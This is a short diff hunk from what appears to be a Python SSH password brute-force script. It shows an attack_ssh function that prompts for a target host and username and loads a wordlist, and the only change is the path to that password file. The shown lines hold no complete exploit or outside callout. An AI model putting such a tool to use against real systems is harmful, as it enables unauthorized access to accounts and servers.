@@ -27,8 +27,8 @@ def attack_ssh(password, code = 0):
 try: 
 	host = input("[*] Enter Target Host Address: ")
 	username = input("[*] Enter SSH Username: ")
-	mostcommon = open('/Users/boltzmann/github/passwords.txt', 'r')
-	mostcommon_size = os.path.getsize('/Users/boltzmann/github/passwords.txt')
+	mostcommon = open('/passwords.txt', 'r')
+	mostcommon_size = os.path.getsize('/passwords.txt')
 	
 	if mostcommon_size == 0:
 		print("\n[*] Size of the current passworld file is: %s" %(mostcommon_size))
